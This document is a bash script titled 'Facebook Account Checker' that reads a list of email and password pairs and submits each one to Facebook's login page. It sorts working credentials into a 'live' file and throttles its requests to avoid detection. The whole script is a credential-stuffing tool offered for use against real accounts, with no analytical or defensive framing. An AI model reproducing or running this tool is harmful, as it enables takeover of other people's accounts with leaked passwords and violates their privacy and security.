#!/bin/bash
# CCOCOT.CO

cat << "EOF"
	 ____   ____ ___  ____  _____   _   _ _____ _____ 
	| __ ) / ___/ _ \|  _ \| ____| | \ | | ____|_   _|
	|  _ \| |  | | | | | | |  _|   |  \| |  _|   | |  
	| |_) | |__| |_| | |_| | |___ _| |\  | |___  | |  
	|____/ \____\___/|____/|_____(_)_| \_|_____| |_|  

		Facebook Account Checker
		Auto Gentod JUANCOK !1!1!1!
		Powered By NAONLAH.NET

EOF


ngecek(){
	local CY='\e[36m'
	local GR='\e[34m'
	local OG='\e[92m'
	local WH='\e[37m'
	local RD='\e[31m'
	local YL='\e[33m'
	local BF='\e[34m'
	local DF='\e[39m'
	local OR='\e[33m'
	local PP='\e[35m'
	local B='\e[1m'
	local CC='\e[0m'
	local ngecurl=$(curl -D - -X POST -s -L "https://www.facebook.com/login.php?login_attempt=1" \
	-A "Mozilla/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/522.11.3 (KHTML, like Gecko) Version/3.0 Safari/522.11.3" \
	-H "content-type: application/x-www-form-urlencoded" \
	-H "accept: */*" \
	-H "referer: https://facebook.com/" \
	-H "cookie: reg_fb_gate=https%3A%2F%2Fwww.facebook.com%2Flogin.php%3Flogin_attempt%3D1;reg_fb_ref=https%3A%2F%2Fwww.facebook.com%2Flogin.php%3Flogin_attempt%3D1;reg_ext_ref=deleted;Max-Age=0;datr=8a7rVFHgDTW9U66-H0-MHhsg" \
	-d "email=${1}&pass=${2}&lsd=AVoan27LdlI&display=&enable_profile_selector=&legacy_return=1&profile_selector_ids=&trynum=1&timezone=&lgnrnd=145129_LhfG&lgnjs=n&default_persistent=0&login=Log+In")
	if [[ $ngecurl =~ "Location: https://www.facebook.com/" || $ngecurl =~ "https://www.facebook.com/mobileprotection?source=mobile_mirror_nux" ]]; then
		printf "${GR}${B}LIVE${CC} | Email: ${1} & Password: ${2}\n"
		echo "${1}|${2}" >> live.txt
	elif [[ $ngecurl =~ "Masuk Facebook | Facebook" ]]; then
		printf "${RD}${B}DIE${CC} | Email: ${1} & Password: ${2}\n"
		echo "${1}|${2}" >> die.txt
	else
		printf "${PP}${B}UNK${CC} | Email: ${1} & Password: ${2}\n"
		echo "${1}|${2}" >> unk.txt
	fi
}

if [[ -z $1 ]]; then
	header
	printf "To Use $0 <mailist.txt> \n"
	exit 1
fi

# SET RATIO
persend=5
setleep=5

IFS=$'\r\n' GLOBIGNORE='*' command eval 'mailist=($(cat $1))'
itung=1

for (( i = 0; i < ${#mailist[@]}; i++ )); do
	username="${mailist[$i]}"
	IFS='|' read -r -a array <<< "$username"
	email=${array[0]}
	password=${array[1]}
	set_kirik=$(expr $itung % $persend)
    if [[ $set_kirik == 0 && $itung > 0 ]]; then
        sleep $setleep
    fi
    ngecek "${email}" "${password}" 
    itung=$[$itung+1]
done
wait